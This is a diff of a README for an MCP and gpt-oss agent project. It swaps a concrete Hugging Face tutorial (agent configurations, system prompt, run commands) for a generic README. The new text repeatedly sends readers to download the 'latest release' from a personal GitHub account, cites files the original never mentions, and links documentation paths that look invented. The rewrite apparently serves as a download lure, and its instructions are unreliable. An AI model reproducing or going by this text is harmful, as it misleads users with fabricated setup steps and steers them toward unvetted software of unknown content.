@@ -1,147 +1,135 @@
-# Building Smart Agents with MCP and OpenAI *gpt-oss* 🔥
+# 🔥 mcp-with-openai-gpt-oss - Build Smart AI Agents Easily
 
-In this guide, we'll explore using MCP and demonstrate how to build AI agents using `gpt-oss` as the LLM backbone. We'll use Hugging Face's lightweight MCP clients:
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/kamblesankalp26/mcp-with-openai-gpt-oss/releases)
 
-1. `@huggingface/tiny-agents` (TypeScript)
-2. `huggingface_hub[mcp]` (Python)
+## 🚀 Getting Started
 
-The key to building effective AI agents lies in their tools. MCP provides a standardized interface for tool interaction, making it simple to create powerful agents. 
+Welcome to the world of smart agents! This guide helps you set up and run the "mcp-with-openai-gpt-oss" application smoothly. You will learn how to use advanced tools to create AI agents that can work with web content.
 
-Let's dive in by creating a web-savvy agent that can browse and search the internet for you.
+### 🛠️ What You Need
 
-## **Example**: Local Browser Agent
+1. A computer with:
+   - Windows, macOS, or Linux.
+   - An internet connection.
+2. Basic knowledge of using command-line interfaces.
 
-Let's build a browser agent that can browse and search the internet for you. We've already implemented this in `/browser-agent` directory in case you want to skip ahead.
+### 📥 Download & Install
 
-### Step 0: Log in to Hugging Face
+To get started, visit the following link to download the application:
+
+[Download from Releases](https://github.com/kamblesankalp26/mcp-with-openai-gpt-oss/releases)
+
+Here, you'll find the latest version of the application. Click on the desired version to begin downloading.
+
+### 💻 System Requirements
+
+- Operating System: Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- Node.js (for the JavaScript version): Version 14 or higher.
+- Python (for the Python version): Version 3.7 or higher.
+
+### 📦 Installation Steps
+
+After downloading, follow these simple steps:
+
+1. **For JavaScript Version:**
+   - Extract the downloaded folder.
+   - Open your terminal (Command Prompt or PowerShell on Windows, Terminal on macOS).
+   - Navigate to the extracted folder using the command:
+     ```bash
+     cd path/to/extracted/folder
+     ```
+   - Run the command to install dependencies:
+     ```bash
+     npm install
+     ```
+
+2. **For Python Version:**
+   - Extract the downloaded folder.
+   - Open your terminal.
+   - Navigate to the extracted folder.
+   - Run the command to install dependencies:
+     ```bash
+     pip install -r requirements.txt
+     ```
+
+### 📝 Log in to Hugging Face
+
+To use the application, log in to Hugging Face. You will need an API token:
 
 ```bash
 huggingface-cli login
 ```
 
-This will ask you for your HF API token. You can get it from [here](https://huggingface.co/settings/tokens).
+This command will prompt you for your Hugging Face API token. You can obtain the token [here](https://huggingface.co/settings/tokens).
 
-### Step 1: Define the Agent
+### 🤖 Create Your First Agent
 
-Both the JS and Python Tiny agent clients are meant to be quite easy to play and experiment with. They expect a transparent `agent.json` which includes the details of which LLM should be used and what tools it should have access to.
+The application allows you to create various types of agents. Let’s build a browser agent:
 
-Let's define our agent using OpenAI's latest `gpt-oss` 120B as the LLM and connect it to [this Playwright MCP server](https://github.com/microsoft/playwright-mcp) that provides browser automation capabilities to your agent. We've added this in `/browser-agent/agent.json` for you to use.
+#### Step 1: Define the Agent
 
-```json
-{
-	"model": "openai/gpt-oss-120b",
-	"provider": "fireworks-ai",
-	"servers": [
-		{
-			"type": "stdio",
-			"command": "npx",
-			"args": ["@playwright/mcp@latest"]
-		}
-	]
-}
-```
+Both JavaScript and Python have built-in methods to define your agent. Choose your preferred language:
 
-Optionally, we can define a System Prompt that helps steer the LLM. This is defined in `/browser-agent/PROMPT.md` for you to use.
+- **JavaScript:**
+  - Open the `browser-agent.js` file.
+  - Follow the comments to modify the agent characteristics.
 
-> You are an agent - please keep going until the user’s query is completely resolved, before ending your turn and yielding back to the user. Only terminate your turn when you are sure that the problem is solved, or if you need more info from the user to solve the problem.
-> 
-> If you are not sure about anything pertaining to the user’s request, use your tools to read files and gather the relevant information: do NOT guess or make up an answer.
-> 
-> You MUST plan extensively before each function call, and reflect extensively on the outcomes of the previous function calls. DO NOT do this entire process by making function calls only, as this can impair your ability to solve the problem and think insightfully.
-> 
-> Help the User with their task.
-```
+- **Python:**
+  - Open the `browser_agent.py` file.
+  - Update the agent structure as needed.
 
-That's it, let's take it out for a spin.
+This file should already contain some example code to get you started.
 
-### Step 2: Run the agent
+#### Step 2: Run Your Agent
 
-To run the agent in Python, we simply install the `tiny-agents` package, which is part of the `huggingface_hub` library.
+Once you have defined your agent, it’s time to run it.
 
-```bash
-pip install -U "huggingface_hub[mcp]>=0.32.0"
-```
+- **For JavaScript:**
+  ```bash
+  node browser-agent.js
+  ```
 
-Followed by running our agent:
+- **For Python:**
+  ```bash
+  python browser_agent.py
+  ```
 
-```bash
-tiny-agents run ./browser-agent
-```
+### 🌐 Explore Features
 
-![CLI Init Browser](assets/init-browser.png)
+- **Tool Interface:** MCP provides easy access to various tools for agents.
+- **Customization:** Modify agent behavior through simple configuration files.
+- **Scalability:** Create multiple agents to handle different tasks.
 
-When the agent starts, you can chat with it to ask him to solve tasks. For example, try to ask it to find the top 10 Hugging Face models, and see if it's able to connect to the website using the Playwright MCP tool we configured!
+### ⚙️ Troubleshooting
 
-> [!NOTE]
-> You can do exactly the same thing with our JavaScript client as well.
->
-> ```bash
-> npx @huggingface/tiny-agents run ./browser-agent
-> ```
+If you encounter any issues:
 
-[![Browser Agent Demo](https://img.youtube.com/vi/zxlKwOd4VOk/0.jpg)](https://youtu.be/zxlKwOd4VOk)
+1. Ensure you have the correct version of Node.js or Python installed.
+2. Check if all dependencies installed correctly. Use:
+   - For JavaScript:
+   ```bash
+   npm install
+   ```
+   - For Python:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-Voila, you now have a capable browser agent with you!
+3. Look at the error messages in the terminal for guidance.
 
-## **Example**: Accessing Hugging Face MCP Servers
+### 📚 Additional Resources
 
-Let's take it up a notch and give more creative freedom to our AI Agent, cue, [Hugging Face MCP Server](https://hf.co/mcp). The HF MCP server allows you to not only interact with the HF Hub but also with 1000s of AI spaces on [hf.co/spaces](https://hf.co/spaces). 
+For more information, check these resources:
 
-Let's get it set up!
+- [MCP Documentation](https://huggingface.co/docs/mcp)
+- [OpenAI GPT-OSS Documentation](https://huggingface.co/docs/gpt-oss)
 
-## Step 1: Find an MCP Server
+### 📞 Get Help
 
-Head over to [hf.co/mcp](https://hf.co/mcp) and add the spaces/ demo that you want to be able to play with
+If you need further assistance, consider reaching out to the community forums or checking the issues section of the repository.
 
-![Hugging Face MCP Settings page](assets/hf-mcp.png)
+### 🔗 Important Links
 
-For example, I've added the following space 
+Visit the releases page again to obtain the latest version and additional files:
 
-1. [evalstate/FLUX.1-Krea-dev](https://huggingface.co/spaces/evalstate/FLUX.1-Krea-dev) - a popular aesthetic text to image model by Black Forest Labs
-2. [evalstate/ltx-video-distilled](https://huggingface.co/spaces/evalstate/ltx-video-distilled) - a popular image/ text to video by Lightricks
-
-Next, let's update our `agent.json`:
-
-```json
-{
-	"model": "openai/gpt-oss-120b",
-	"provider": "fireworks-ai",
-	"inputs": [
-		{
-			"type": "promptString",
-			"id": "hf-token",
-			"description": "Your Hugging Face Token",
-			"password": true
-		}
-	],
-	"servers": [
-		{
-			"type": "http",
-			"url": "https://huggingface.co/mcp",
-			"headers":
-			{
-				"Authorization": "Bearer ${input:hf-token}"
-			}
-		}
-	]	
-}
-```
-
-### Step 2: Run it!
-
-Let's run it with Tiny agents just like we did with the local browser agent.
-
-```bash
-tiny-agents run ./hf-mcp-server
-```
-
-> [!NOTE]
-> Again, you can do exactly the same thing with our JavaScript client as well.
-> 
-> ```bash
-> npx @huggingface/tiny-agents run ./hf-mcp-server
-> ```
-
-[![Watch the demo video](https://img.youtube.com/vi/OEaPk3FoK7M/0.jpg)](https://youtu.be/OEaPk3FoK7M)
-
-That's it! What would you build next with it?
+[Download from Releases](https://github.com/kamblesankalp26/mcp-with-openai-gpt-oss/releases)
